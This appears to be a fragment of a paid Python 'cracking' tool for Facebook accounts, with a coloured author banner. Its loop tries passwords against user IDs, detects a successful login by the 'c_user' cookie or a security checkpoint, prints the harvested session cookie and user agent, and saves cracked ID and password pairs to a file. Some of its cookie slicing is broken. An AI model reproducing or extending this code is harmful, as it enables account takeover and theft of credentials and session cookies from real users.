...
\t\x1b[1;92m╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░░░░░░╚═╝░╚════╝░"  
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[👬]  \033[1;32mCREATED BY\33    :  \033[1;33mDX AJMIR HOSSAIN\33[0;m\033[1;32m
\033[1;32m[👬]  \033[1;32mFACEBOK      : \033[1;34m DX Ajmir Hossain 
\033[1;32m[👬]  \033[1;32mGITHUB       :  \033[1;35mAK-40  
\033[1;32m[👬]  \033[1;32mTOOL VIRSION :  \033[1;36m1.0.0
\033[1;32m[👬]  \033[1;32mTOOL TYPE    : \033[1;32m PAID
\033[1;92m══════════════════════════════════════════════════════
""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:66]
                print('    \033[1;32m(DX-Ajmir-OK😍”¥)  ' +uid+ ' | ' +ps+    '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/DX-Ajmir😍.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:56]
                print('    \33[1;31m(DX-Ajmir-CP•)  ' +uid+ ' | ' +ps+           '  \33[1;33m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[DX-Ajmir] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
